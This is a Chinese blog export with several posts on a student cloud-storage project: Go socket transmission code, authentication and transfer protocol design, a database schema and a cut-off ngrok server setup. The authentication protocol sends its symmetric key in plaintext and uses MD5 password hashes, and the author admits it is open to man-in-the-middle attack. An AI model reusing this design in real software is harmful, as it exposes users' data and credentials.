包中介绍，现在假设已经拥有这两个函数。 123456789101112131415161718192021222324252627282930313233343536// transmit.gofunc (t *transmitter) SendBytes(toSend []byte) bool &#123; if t.buf == nil || t.conn == nil &#123; return false &#125; totalLength := len(toSend) _, err := t.conn.Write(auth.Int64ToBytes(int64(totalLength))) if err != nil &#123; return false &#125; chRate := time.Tick(2e3) alSend := 0 var length int for &#123; &lt;-chRate if totalLength == alSend &#123; break &#125; if totalLength-alSend &lt; int(t.buflen/3) &#123; length = totalLength - alSend &#125; else &#123; length = int(t.buflen / 3) &#125; copy(t.buf[16:], toSend[alSend:alSend+length]) copy(t.buf, auth.Int64ToBytes(int64(length))) encoded := auth.AesEncode(t.buf[16:length+16], t.block) copy(t.buf[8:], auth.Int64ToBytes(int64(len(encoded)+16))) copy(t.buf[16:], encoded) _, err = t.conn.Write(t.buf[:len(encoded)+16]) if err != nil &#123; return false &#125; alSend += length &#125; return true&#125; 上面的代码中，chRate 是一个只读的 channel，它来自内置的 time 库，可用于控制发送速度。如果发送方发送频率大于接收方接收频率，则可能出现阻塞和数据丢失，因此必须限制发送方的 chRate 速度慢于接收方的接收速率。alSend 表示已经发送的数据长度。经验表明，使用 AES CFB 加密时，密文长度通常不会超过明文长度的两倍，为了保险，我们设置密文长度上限为缓冲区长度，因此每个消息可携带的明文长度至多为缓冲区长度的 1/3。代码的第 18 行用于判断接下来要发送的消息需要携带的明文长度，如果剩余要发送的数据长度大于 1/3 个缓冲区长度，则发送 1/3 个缓冲区长度的明文，否则只发送剩余的明文。23 ~ 27 行构造发送的消息，消息格式和此前设计的 格式1 相同。函数返回的 bool 值表明发送是否成功。 RecvBytes()([]byte, error)的接收过程如下：首先从 socket 读取 8 个字节，按大端序转为 int64 类型，得到要接收数据的总长度。之后严格按照 格式1 接收消息，每次先接收 16 字节，根据前 8 字节获得即将接收的消息携带的明文长度，根据后 8 字节获得整个消息的长度。当接收到的数据长度达到总长度时，将停止接收并以字节流返回本次调用接收到的所有数据。代码如下，其中第 7 行用到的 RecvUntil(until int64, init int64, chRate &lt;-chan time.Time)(int64, err) 方法的作用是，当前缓冲区已有长度为 init 的数据，该方法将以 chRate 指定的速率一直从 socket 读取，直到缓冲区长度达到了 until，并返回现在缓冲区持有的数据长度。如果在方法调用期间出现异常，返回值将携带错误消息。该方法的代码将在介绍完 RecvBytes() 后立刻给出，你可以先拖到下面查看该方法具体实现。 12345678910111213141516171819202122232425262728293031323334353637383940414243// transmit.gofunc (t *transmitter) RecvBytes() ([]byte, error) &#123; var err error if t.buf == nil || t.conn == nil &#123; return nil, err &#125; chRate := time.Tick(1e3) length, err := t.RecvUntil(8, t.recvLen, chRate) if err != nil &#123; return nil, err &#125; totalLength := auth.BytesToInt64(t.buf[:8]) var toRecvLength int64 = totalLength var plength int64 = 0 var elength int64 = 0 var pRecv int64 = length - 8 defer func() &#123; t.recvLen = pRecv &#125;() copy(t.buf, t.buf[8:length]) returnBytes := make([]byte, 0, conf.AUTHEN_BUFSIZE) for &#123; if toRecvLength == int64(0) &#123; return returnBytes, nil &#125; pRecv, err = t.RecvUntil(int64(16), pRecv, chRate) if err != nil &#123; return nil, err &#125; plength = auth.BytesToInt64(t.buf[:8]) elength = auth.BytesToInt64(t.buf[8:16]) pRecv, err = t.RecvUntil(elength, pRecv, chRate) if err != nil &#123; return nil, err &#125; receive, err := auth.AesDecode(t.buf[16:elength], plength, t.block) if err != nil &#123; return nil, err &#125; returnBytes = append(returnBytes, receive...) toRecvLength -= plength copy(t.buf, t.buf[elength:pRecv]) pRecv -= elength &#125;&#125; 上面的代码中，第 12 行获取要接收的数据总长度，并将 toRecvLength 和 totalLength 均赋值为该长度。第 16 行将 pRecv 赋值为当前缓冲区已有数据长度，在方法执行期间，该变量将始终指代缓冲区存在的待处理数据长度，第 17 行指定当方法结束时将 pRecv 赋值给 transmitter 内私有变量 recvLen。在每次接收消息前，先判断当前已接收到全部明文（toRecvLength == 0），之后接收每个消息的前 16 个字节，再接收整个消息。elength 为当前要接收的消息的总长度（密文长度+16），plength 为当前要接收消息携带的明文长度。在上面代码的倒数第 3 ~ 4 行，pRecv -= elength 维护缓冲区待处理数据长度，copy(t.buf, t.buf[elength:pRecv]) 维护缓冲区待处理数据内容。 方法 RecvUntil(int64, int64, &lt;-chan time.Time) (int64, error) 的实现如下。这个方法应当被定义为私有的（方法首字母小写），这里因为编写时的失误没有注意，在这里保留这个漏洞，作为警醒。 123456789101112131415// transmit.gofunc (t *transmitter) RecvUntil(until int64, init int64, chR &lt;-chan time.Time) (int64, error) &#123; for &#123; if init &gt;= until &#123; break &#125; &lt;-chR length, err := t.conn.Read(t.buf[init:]) if err != nil &#123; return init, err &#125; init += int64(length) &#125; return init, nil&#125; SendFromReader() 和 RecvToWriter() 这两个方法和上面的 SendBytes()、RecvBytes()类似，区别在于读取/接收的对象是 Reader/Writer。 SendFromReader(*bufio.Reader, int64) bool 方法代码如下，和 SendBytes() 的主要不同在，每次发送的数据长度由交付 Reader 的缓冲区约束，同时要判断当前读取的 Reader 是否到达 EOF 边界，如果到达则表明发送结束，应当返回 true，否则才返回 false 表明传输出错。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// transmit.gofunc (t *transmitter) SendFromReader(reader *bufio.Reader, totalLength int64) bool &#123; if t.buf == nil || t.conn == nil &#123; return false &#125; _, err := t.conn.Write(auth.Int64ToBytes(totalLength)) if err != nil &#123; return false &#125; sendLength := totalLength chRate := time.Tick(2e3) var encodeBufLen int64 = t.buflen/3 - 16 var length int for &#123; &lt;-chRate if sendLength &lt;= 0 &#123; return true &#125; if sendLength &gt;= encodeBufLen &#123; length, err = reader.Read(t.buf[16 : 16+encodeBufLen]) &#125; else &#123; length, err = reader.Read(t.buf[16 : 16+sendLength]) &#125; if err != nil &#123; if err.Error() == \"EOF\" &#123; return true &#125; else &#123; return false &#125; &#125; copy(t.buf, auth.Int64ToBytes(int64(length))) encoded := auth.AesEncode(t.buf[16:length+16], t.block) copy(t.buf[8:], auth.Int64ToBytes(int64(len(encoded)+16))) copy(t.buf[16:], encoded) _, err = t.conn.Write(t.buf[:len(encoded)+16]) if err != nil &#123; return false &#125; sendLength -= int64(length) if length == 0 &#123; return true &#125; &#125;&#125; RecvToWriter(*bufio.Writer) bool 方法实现代码如下，它和 RecvBytes() 的主要不同在于，在函数退出时需要使用 Writer 的 Flush() 方法将缓冲区数据全部写入，并且在 Writer 写入的过程中需要检查写入是否正确。此外，增加了 valid 变量，因为 Writer 写入的错误不应当影响网络连接的传输，因此当出现本地系统错误时，为了不破坏传输，将使 valid 为 FALSE，但传输将继续进行，最终返回给用户的值为 FALSE。这里的实现非常不人性化，另一种实现方式是，无论出现的错误是用户客户端本地错误还是网络连接错误，均直接返回 FALSE，通常应用 RecvToWriter 的场景是传输长数据流，在返回 FALSE 时，多数调用 transmitter 的父函数会立刻命令 transmitter 终止。因此这里直接返回 FALSE 可能是更好的实现方式，避免了不必要的带宽浪费。这里经过权衡，最终代码中选择直接返回 FALSE，但这里保留使用 valid 变量的代码留作对比。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// transmit.gofunc (t *transmitter) RecvToWriter(writer *bufio.Writer) bool &#123; var err error if t.buf == nil || t.conn == nil &#123; return false &#125; chRate := time.Tick(1e3) length, err := t.RecvUntil(8, t.recvLen, chRate) if err != nil &#123; return false &#125; totalLength := auth.BytesToInt64(t.buf[:8]) var valid bool = true var recvLength int64 = 0 var plength int64 = 0 var elength int64 = 0 var pRecv int64 = length - 8 defer func() &#123; t.recvLen = pRecv &#125;() copy(t.buf, t.buf[8:length]) for &#123; if recvLength == int64(totalLength) &#123; writer.Flush() return valid &#125; pRecv, err = t.RecvUntil(int64(16), pRecv, chRate) if err != nil &#123; return false &#125; plength = auth.BytesToInt64(t.buf[:8]) elength = auth.BytesToInt64(t.buf[8:16]) pRecv, err = t.RecvUntil(elength, pRecv, chRate) if err != nil &#123; return false &#125; receive, err := auth.AesDecode(t.buf[16:elength], plength, t.block) if err != nil &#123; valid = false &#125; outputLength, outputError := writer.Write(receive) if outputError != nil || outputLength != int(plength) &#123; valid = false &#125; recvLength = recvLength + plength copy(t.buf, t.buf[elength:pRecv]) pRecv -= elength &#125;&#125; Transmitable 接口的调用 当试图发送一个文本类型的指令 command 时，Transmitable 变量可以直接调用 SendBytes(command)，远端调用 RecvBytes() 即可获取 command。 当试图发送一个文件时，发送端创建一个 Reader 对象 reader 并获取文件大小 length，调用 SendFromReader(reader, length)，接收端创建一个 Writer 对象 writer，调用 RecvToWriter(writer)。 专栏目录：顶点云（应用）设计与实现此专栏的上一篇文章：顶点云（应用）认证、传输协议设计此专栏的下一篇文章：顶点云（应用）认证基础模块实现 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/14/zenith-cloud-2/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"},{"name":"云存储","slug":"云存储","permalink":"http://forec.github.io/tags/云存储/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"顶点云（应用）认证、传输协议设计","slug":"zenith-cloud-1","date":"2016-11-13T04:32:01.000Z","updated":"2016-12-23T17:33:44.000Z","comments":true,"path":"2016/11/13/zenith-cloud-1/","link":"","permalink":"http://forec.github.io/2016/11/13/zenith-cloud-1/","excerpt":"分析、设计简易云存储系统之间的协议，包括用户客户端和服务器之间的认证协议、数据传输的协议以及新加入线程的认证。","text":"分析、设计简易云存储系统之间的协议，包括用户客户端和服务器之间的认证协议、数据传输的协议以及新加入线程的认证。 保活连接服务器和客户端之间应当维护几个固定连接，同时随用户发起的文件传输任务，二者间应建立一些短时间的活动连接。 用于命令和文本数据传输的交互连接：此连接用于用户向服务器发送命令和接收服务器返回的文本响应，云存储服务器将会把客户端登录、认证时创建的连接作为该连接，在客户端活动期间，此连接应始终保持活动。 客户端用于接收推送消息的连接：单向连接，仅用于客户端接收服务器推送的消息，在客户端活动期间，此连接应始终保持活动。 客户端用于上传/下载文件的连接：此连接应在需要时建立，传输任务完成时断开。服务器应当限制每个客户端持有此类连接的数量。 用户登录认证协议认证流程 根据上一篇文章中的需求，要实现的云存储系统应当能保证客户端和服务器之间传输的文件内容不被拦截，或者即时被中间人拦截也无法获取原始信息。要实现这一点，必须对传输的消息进行加密，而通信双方均需具有对加密消息解密的能力，因此双方均需持有密钥。非对称加密方式中，通信双方只有持有私钥的一方能够解密，因此如果采用非对称加密，服务器和客户端均需持有自己的私钥和对方的公钥。一个可行的方案是：当用户注册/登陆时，客户端随机生成一组密钥，并和服务器交换公钥，双方使用对方的公钥加密要传输的信息。 在将要实现的云存储系统中，我没有采用上面的方式，而是采用了 AES CFB 对称加密，因为后者相对更容易实现。如果项目完成后还有空余时间，我将更换认证方式。下面要介绍的云存储系统登录认证协议存在漏洞，传输消息可能被拦截、破解。如果中间人拦截到了通信双方使用的随机密钥，则可根据协议构造特定的攻击数据包，获取或破坏用户空间。 客户端和服务器建立连接并认证的过程使用协议如下： 客户端向服务器发起 TCP 请求，服务器监听到请求并建立 Socket 连接 服务器随机生成固定长度的随机密钥 token 并以明文方式发送给客户端 客户端接收 token，并使用 token 加密用户名和密码的 MD5 值，将加密后的数据发送给服务器 服务器接收客户端发送的认证信息，使用 token 对消息解密，获取用户名和密码的 MD5 值，将密码与数据库中存储的密码 MD5 值比对，验证通过则向客户端发送使用 token 加密的 token，否则主动断开连接 客户端等待服务器返回数据或检测到服务器断开连接。如果客户端接收到的数据解密结果不是 token，则主动断开连接并提示认证失败 认证数据协议格式 假定现在已有函数 RecvBytes() ，该函数将在后面的《传输协议的实现和封装》中介绍，它将返回一组维持边界的消息，即该函数能够从 Socket 缓冲区中恰好读取出一组符合协议格式的数据。下面定义协议格式。 服务器生成固定长度随机密钥后，直接向 socket 缓冲区写入该密钥的明文：conn.Write([]byte(token))。因为接下来服务器需要等待客户端响应，因此客户端不需要考虑消息边界，只需要从缓冲区中读取固定长度的字节即可。 客户端从 socket 接收固定长度的 token。 客户端将用户名和密码的 MD5 值使用 token 加密，发送给服务器的包结构如下。因为 AES CFB 算法解密需要获知明文长度，因此传输的包中应当包含该信息：第一个 8 字节表示用户名明文和密码 MD5 值的总长度，第二个 8 字节表示使用 token 将用户名和密码 MD5 值加密后得到的密文长度，第三个 8 字节表示用户名明文的长度，最后跟着密文。前面的三个 8 字节均为 int64 类型的数据的大端序表示。下面称此格式为 格式0。 123 ---------------------------------------------------------------------| 8 bytes | 8 bytes | 8 bytes | encoded username and password | --------------------------------------------------------------------- 服务器接收到客户端发送的认证包，按大端序将包的前 24 个字节分别转化为 3 个 int64 类型，并使用 token 解密后面的密文。如果验证成功，则按照下面 “数据传输协议” 中的 “格式1” 将 token 传输给客户端。 数据传输协议当客户端和服务器建立连接并认证成功后，所有的数据传输操作均应当遵从以下协议。 数据协议格式 应用层数据包格式如下，第一个 8 字节表示明文长度，第二个 8 字节表示密文长度 + 16，后跟密文。两个 8 字节均为大端序表示的 int64 类型。下面称此格式为 格式1 。 123 ----------------------------------------| 8 bytes | 8 bytes | encoded data | ---------------------------------------- 非固定活动连接建立过程当客户端需要执行传输文件操作时，主动向服务器申请连接。连接过程和上面 “认证数据协议格式” 过程类似： 服务器向客户端发送新的随机密钥 token0 客户端不再将用户名和密码的 MD5 值发送给服务器，而是将用户名和之前登录认证时获得的 token1 连接在一起，使用 token0 加密，并发送给服务器（发送此段消息时，使用 格式0 ） 服务器接收到数据后首先解析用户名，发现该用户已登录，则将密码部分字段和该用户登录认证时使用的 token1 比对，符合则返回 token0，否则主动断开连接 客户端检查 token0 无误后开始发送相应指令 被动监听推送消息连接过程此连接和上述 “非固定活动连接建立过程” 类似，区别在于，该连接在整个客户端存活期间均得以保持。为了将此连接和用于传输长数据流的数据区分，服务器将会把用户登录后申请的第一个 “非固定活动连接”（即密码字段填写 token1 的连接）视作客户端用来监听推送消息的连接，而之后的连接均视作用于传输长数据流的连接。 执行指令协议下面考虑客户端向服务器发送的指令格式，根据指令执行所需要传输的数据流长短，将指令分为端数据流传输指令和长数据流传输指令。其中长数据流传输指令包括文件的上传、下载以及更新。为了简化客户端的实现（正式客户端使用 C++ 编写），指令的传输使用纯文本代替了 JSON 格式。下面用 SEP 表示指令间各个选项的分隔符。SEP 是项目中配置文件可以指定的一个字符串。 短数据流传输指令 创建：在云存储空间中创建一个新的文件（夹），初始大小为 0。如果该文件是文本类型，则用户可在线编辑该文件并保存。对于创建操作，需要指定创建的位置、创建的文件（夹）的名称、要创建的是文件还是文件夹。即：TOUCH &lt;SEP&gt; NAME &lt;SEP&gt; PATH &lt;SEP&gt; ISDIR，ISDIR为 0 时创建文件，为 1 时创建文件夹。PATH为绝对路径，如 /home/forec/work/。 复制：将某个文件（夹）拷贝到一个新的位置，即：CP &lt;SEP&gt; UID &lt;SEP&gt; NEWPATH，其中 UID 为要复制的文件（夹）的 ID，以下 UID 均指此意，NEWPATH 为绝对路径。 移动：将某个文件（夹）移动到一个新的位置，同时指定新的文件（夹）名，即：MV &lt;SEP&gt; UID &lt;SEP&gt; NEWNAME &lt;SEP&gt; NEWPATH，其中 NEWPATH为绝对路径。 删除：删除某个文件（夹），若为文件夹，该目录下所有文件（夹）均被删除，即RM &lt;SEP&gt; UID。 获取文件列表：获取某个目录下的文件（夹）列表，支持按关键词筛选，即：LS &lt;SEP&gt; RECURSSIVE &lt;SEP&gt; PATH &lt;SEP&gt; ARG0 &lt;SEP&gt; ARG1 &lt;SEP&gt; ...。其中，RECURSSIVE为 0 表示仅显示该目录下的文件（夹），为 1 表示递归显示，将整个目录内的所有文件（夹）列表返回给客户端；PATH 为绝对路径，ARGn 为要筛选的关键词，例如在 SEP 为 + ，筛选条件为路径 /home/ 下所有文件（夹）名包括 ed 和 afd 的情况下，可使用 LS+1+/home/+ed+afd。服务器向客户端返回的是一个以 \\n 划分的纯文本流，每行为一个文件记录，记录各项之间以 SEP 划分。 FORK：Fork其它用户的文件（夹），即：FORK &lt;SEP&gt; UID &lt;SEP&gt; PASSWORD &lt;SEP&gt; NEWPATH，其中 PASSWORD 是要 Fork 的文件（夹）的提取码，如果不存在提取码则可为任意值，NEWPATH 为要 Fork 到自己存储空间中的路径， UID 为要 Fork 的文件（夹）的唯一标识。 改变私有/共享：改变某个文件（夹）的私有或共享性质，即：CHMOD &lt;SEP&gt; UID &lt;SEP&gt; PRIVATE，其中 PRIVATE 为 0 表示共享，PRIVATE 为 1 表示私有，若 PRIVATE 为 1，则系统将随机生成一个 4 位提取码，并将该文件或文件夹下的所有文件提取码设置为该提取码。 向其他用户发送消息：即 SEND &lt;SEP&gt; CID &lt;SEP&gt; MESSAGE，其中 CID 为对方的唯一标识符，MESSAGE 为要发送的消息，其中不能包含 SEP。 以上所有消息均会返回一个状态码，表示成功或错误信息。状态码将在具体实现时讨论。 长数据流传输指令下载文件（夹） 下载指定 UID 对应的文件（夹），即：GET &lt;SEP&gt; UID &lt;SEP&gt; PASSWORD。当 UID 指向的记录不是用户自己的时，需要使用 PASSWORD 作为提取码，如果要下载的 UID 是用户自己的文件（夹），则 PASSWORD 可以填写任意非空值（这里为了简化服务器对指令的识别，选择了非常幼稚的方法）。每启动一条这样的指令，客户端将主动建立一个新的长数据流传输连接，当客户端创建的长数据流传输连接达到设置的上限时，客户端将阻止创建新的连接，并将新的命令排队，直到此前的长数据流传输连接结束后，才会启动下载线程。 服务器与客户端传输线程之间交互的过程： 客户端发送 GET 命令 服务器接收 GET 命令并检查命令是否合法，包括检查文件是否存在、用户是否具有此文件的读权限等，如果合法返回 &quot;VALID&quot;，否则返回 &quot;NOTPERMITTED&quot;。 服务器发送要下载的文件数目（包括文件夹的数目），使用 8 个字节的 int64 类型表示此数目。 对每个文件： 服务器发送该文件文件名 服务器发送 ISDIR，即是文件还是文件夹（0或1），若该文件为文件夹（1），则跳过下面的循环，使用 8 个字节的 int64 类型表示 1 或 0。 服务器开始传输文件 文件传输结束，进入下一个循环 上传文件 上传一个新的文件，即：PUT &lt;SEP&gt; UID &lt;SEP&gt; SIZE &lt;SEP&gt; MD5。其中 MD5 为客户端计算的文件的 MD5 值， SIZE 为要上传的文件大小。 服务器与客户端传输线程之间交互的过程： 客户端发送 TOUCH 指令创建空文件 服务器接收客户端发送的 PUT 指令，向创建的空文件写入数据 服务器向客户端发送标识码，上传成功（200）；开始传输（201）；传输出错（203）；指令不合法（300）；文件尚未创建（301）；md5不匹配（403）；服务器内部错误（500） 更新文件 更新一个已有的文件，即： UPDATE &lt;SEP&gt; UID &lt;SEP&gt; MD5。 服务器与客户端传输线程之间交互过程： 服务器接收客户端发送的 PUT 指令，重新向原文件写入数据 若云存储中存在新的 MD5 值，则向客户端发送不需传送（300），客户端停止发送并认为秒传成功 若云存储中不存在新的 MD5 值，则向客户端发送开始传送（200），传送结束后，修改原 UID 指向的文件块 若发现 UPDATE 指令不合法，则返回错误码 指令的简化为了简化客户端设计，服务器应当尽量对客户端发送的指令容错。例如： 文件下载时，客户端仅需发送 UID，服务器根据 UID 指向的记录，为客户端安排下载策略 文件创建/移动/复制时，若目标路径不存在，服务器应向数据库中添加缺失的路径 大文件 MD5 值计算 将文件按 4M 分块，最后一块不足 4M 也算一块 每块计算 MD5 值，将分别计算出的 MD5 值相连 将相连的 MD5 值再计算一次 MD5 值 专栏目录：顶点云（应用）设计与实现此专栏的上一篇文章：顶点云（应用）项目简介此专栏的下一篇文章：顶点云（应用）传输协议实现和封装 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/13/zenith-cloud-1/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"},{"name":"云存储","slug":"云存储","permalink":"http://forec.github.io/tags/云存储/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"顶点云（应用）项目简介","slug":"zenith-cloud-0","date":"2016-11-12T15:50:33.000Z","updated":"2016-12-23T17:26:14.000Z","comments":true,"path":"2016/11/12/zenith-cloud-0/","link":"","permalink":"http://forec.github.io/2016/11/12/zenith-cloud-0/","excerpt":"顶点云为我 2016 年的某个课程设计，旨在基于北邮校园网搭建一个小规模的云存储、共享平台。本文简单介绍顶点云应用程序服务器设计目标，分析需求。此文章发布时项目尚未编写完成，与此项目相关的文章将随项目同步更新，并收集在专栏 《顶点云设计与实现》 中。","text":"顶点云为我 2016 年的某个课程设计，旨在基于北邮校园网搭建一个小规模的云存储、共享平台。本文简单介绍顶点云应用程序服务器设计目标，分析需求。此文章发布时项目尚未编写完成，与此项目相关的文章将随项目同步更新，并收集在专栏 《顶点云设计与实现》 中。 写在前面 顶点云为我 2016 年的某项课程设计，项目题目为自拟，目标是基于北邮校园网搭建一个小规模的云存储、共享平台。项目在 GitHub 托管仓库的网址是：https://github.com/Forec/zenith-cloud。 此部分文章主要介绍顶点云的应用程序服务，同时附带了一个用于测试的客户端（无GUI）。顶点云正式的客户端目前正在由 non1996 编写。在我写下这篇文章时，顶点云的应用程序服务器已经实现了文件传输以外的多数逻辑功能，以及文件的并发下载。 在接下来的文章中，代码的具体实现均使用 Golang 代码表示，我将假设读者掌握 Golang 的基本语法（或者 C/C++ 的基本语法），并且了解 channel、goroutine 的概念。 作为本科阶段的一项小型课程设计，且时间紧迫，我很遗憾此项目中很多实现非常幼稚，许多地方为了简化实现，我采用了一些闭门造车的、很愚笨的、且与主流实现方案相悖的方式。在将基本功能实现后，如果还有空余时间，我会尽量修正这些糟粕，简化代码。这个项目的 BETA 版本预计完成时间在 11 月底，12 月上旬将完成客户端的图形界面，12 月中旬将完成 Web 版本。如果还有空余时间，可能会考虑实现一个 Android 客户端。 项目介绍面向用户功能 文件存储：用户可将文件上传至云服务器 文件下载：用户可从云服务器下载文件 文件传输状态保存（视项目进度快慢考虑）：支持用户下载/上传文件过程中暂停 文件共享：用户间可分享资源，通过共享链接和提取码获取其他用户的私有分享文件 文件秒传：云存储空间存在相同文件时直接 Fork Fork：用户可 Fork 其他用户分享的文件至自己的存储空间 文件操作：用户可对自己上传的文件/Fork的文件进行管理，包括最基本的拷贝、移动、删除 目录操作：用户可对自己存储空间中的文件目录进行管理，包括最基本的拷贝、移动、删除、新建 在线编辑：用户可在客户端/Web端即时新建并编辑一个文本文件，并随时更新至云服务器 图片在线浏览：用户可在线浏览云服务器上的图片 视频在线播放：用户可在客户端播放云服务器上的视频文件 基本用户交流：用户间可以发送消息，可进行时延不高的延时通讯 URL导入数据（视项目进度快慢考虑）：用户可从 URL 导入文件至云存储，即实现类似迅雷离线下载功能 系统功能 文件分块、重用：将文件分块存储，不同文件的相同块仅存储一次，节省物理存储空间。在要实现的云存储系统中，为了降低复杂度，文件将不分块存储，仅仅实现相同文件的重用 文件压缩存储、传输：用户上传、下载的文件应采用某种压缩算法以节省带宽 文件并发下载：用户下载多个文件时，在允许线程内应支持并发下载 文件传输状态保存（视项目进度快慢考虑）：用户下载/上传文件过程中触发终端操作时，传输进度的保存 用户目录管理：系统应当对每个用户分别维护文件目录结构 用户权限管理：用户文件只能被用户自己或其他持有文件提取码的用户查看、下载、Fork，用户文件只能由用户自身管理（移动、删除、设置私有/分享） 用户消息推送：管理员可以向用户推送消息 用户消息传递：系统应提供渠道使用户间的消息在短时延内交互，如用户间分享文件提取码 用户认证管理：同一时刻允许且仅允许一个用户客户端在线，后登录的客户端应当使先登录的客户端下线。数据库中应存储用户密码的不可逆加密值，用户登录及文件传输过程应使用随机密钥加密（保险的方式是对随机密钥采用非对称加密，但为了简化实现难度，要实现的云存储系统将使用对称加密算法，因此安全性有很大隐患，在后面的文章中将分析对我实现的云存储系统进行中间人攻击的可行性） 原理分析存储逻辑 要实现重复文件的非冗余存储，需要对每个上传的文件块（在要实现的云存储系统中，因为去除了文件分块操作，因此下面所有“文件块”实际上是文件）计算该文件块的 MD5 值，与数据库中已存在的 MD5 值对比，相同则直接 Fork 并取消用户的上传操作（文件秒传）。 相同的文件块仅存储一次，每个文件块应当维护一个“引用值”。“引用”的定义为：当多个用户在各自的存储空间中分别保存同一个文件一次或多次，则实际上这些文件均指向同一个文件块 B，而在物理存储中，文件块 B 仅存储一次。我们称这些用户各自存储空间中的文件记录引用了 B，称这些用户在各自存储空间中指向 B 的文件记录为 B 的引用。 根据引用的定义，只要存在某个用户在自己的云存储空间中保存了文件块 B 的引用，该文件块就不能删除。当某个用户对文件块 B 的引用做复制、Fork操作时，文件块 B 的引用值应当随操作数增加；当某个用户删除文件块 B 的某个引用时，文件块 B 的引用值应随删除次数减少。 存储逻辑对用户不可见，即用户可以修改自己用户空间中的引用（引用实际就是用户所看见的文件），如重命名、移动、复制等，但修改的对象仅仅是用户空间中的引用，而非真实的文件块。只有用户对引用的内容做修改时（例如此引用指向一个文本文件，用户修改了文本文件的内容并试图保存），系统才应当创建新的文件块以记录修改。在下面的介绍中，“引用”和“文件”等价，均为数据库中指向文件块的一条记录，而“文件块”才代表真正物理存储中的文件。 用户目录维护：为了简化用户存储空间的目录维护，我将每个目录均视作一类特殊的引用，关于这一点的原因、实现和分析将在后面的文章中讨论。举个例子，用户云存储空间中有一个文件 /home/forec/run.sh ，则在数据库的引用表中，有四条记录属于该用户，分别是 /，/home/，/home/forec/ 和 run.sh。 数据库结构根据存储逻辑和之前的功能介绍，我们需要五个表分别记录：文件块、文件块的引用、用户、用户消息、用户操作记录。 文件块表 文件块的 ID：此列应为该表的主键，自增，INTEGER PRIMARY KEY AUTOINCREMENT 文件块的 MD5值，VARCHAR(32) 文件块的大小，单位为字节：INTEGER 文件块的引用数：INTEGER 文件块的创建时间：DATE 文件块引用表 文件块引用的 ID：此列应为该表的主键，自增，INTEGER PRIMARY KEY AUTOINCREMENT 文件块引用的所属用户 ID：INTEGER 引用的文件块的 ID：INTEGER 引用在用户目录下的绝对路径：用户根目录为 /，此列类似 /home/work/cloud/，VARCHAR(256) 引用的外链：当用户试图共享此引用时，其他用户可以通过外链访问此引用（Web端，客户端应当可以解析此外链并在客户端中打开）。如果该引用为私有，其他用户需要输入提取码才可查看，VARCHAR(128) 引用创建的时间：DATE 引用的分享数：当一个用户分享该引用时，如果其它用户 Fork 了该引用，则该引用的分享数应增加。与 GitHub 上的 Fork 操作不同的是，如果用户 B Fork 了用户 A 的某个引用，用户 C 又从用户 B Fork 了这个引用，则 A 的引用分享数增加 1（B 的 Fork 操作），用户 B 的引用分享数增加 1（C 的 Fork 操作），INTEGER 引用的下载数：当一个用户从此引用下载对应的文件块时，此引用下载数增加，INTEGER 引用的文件名：此项为用户所看到的文件名，可能有多个不同名的引用指向同一个文件块，VARCHAR(128) 引用的私有性：此引用是否对其它用户可见，默认为私有，即仅用户个人可见，BOOLEAN 引用的提取码：在用户设置引用为私有的情况下，可以生成外链，持有该外链提取码的其它用户可以查看该引用，VARCHAR(4) 引用是否为目录：此引用是一个目录（文件夹）还是一个文件，BOOLEAN 用户列表 用户的 ID：此列应为该表的主键，自增，INTEGER PRIMARY KEY AUTOINCREMENT 用户名：此列应唯一，VARCHAR(64) 用户密码加密后的值：VARCHAR(128) 用户创建时间：DATE 用户消息列表 消息的 ID：此列应为该表的主键，自增，INTEGER PRIMARY KEY AUTOINCREMENT 接收消息的用户的 ID：INTEGER 发送消息的用户的 ID：INTEGER 消息内容：VARCHAR(512) 消息发送时间：DATE 用户操作记录列表 操作记录的 ID：此列应为该表的主键，自增，INTEGER PRIMARY KEY AUTOINCREMENT 用户的 ID：INTEGER 操作内容：VARCHAR(128) 操作时间：DATE 专栏目录：顶点云（应用）设计与实现此专栏的下一篇文章：顶点云（应用）的认证、传输协议设计 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/12/zenith-cloud-0/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"},{"name":"云存储","slug":"云存储","permalink":"http://forec.github.io/tags/云存储/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"CVM 操作记录","slug":"cloud-virtual-machine-config","date":"2016-11-02T15:08:14.000Z","updated":"2017-11-06T02:42:11.000Z","comments":true,"path":"2016/11/02/cloud-virtual-machine-config/","link":"","permalink":"http://forec.github.io/2016/11/02/cloud-virtual-machine-config/","excerpt":"CVM 上的操作记录。","text":"CVM 上的操作记录。 CentOS 7.2ngrok 服务器搭建可参考 imike 的CentOS下部署Ngrok服务器。 安装依赖库 12sudo yum updatesudo yum install build-essential golang mercurial git 获取 ngrok 源码 12git clone https://github.com/inconshreveable/ngrok.git ngrokcd ngrok 生成证书并替换代码中默认证书，修改域名为解析到云主机的域名。 1234567NGROK_DOMAIN=\"cross.forec.cn\"openssl genrsa -out base.key 2048openssl req -new -x509 -nodes -key base.key -days 10000 -subj \"/CN=$NGROK_DOMAIN\" -out base.pemopenssl genrsa -out server.key 2048openssl req -new -key server.key -subj \"/CN=$NGROK_DOMAIN\" -out server.csropenssl x509 -req -in server.csr -CA base.pem -CAkey base.key -CAcreateserial -days 10000 -out server.crtcp base.pem 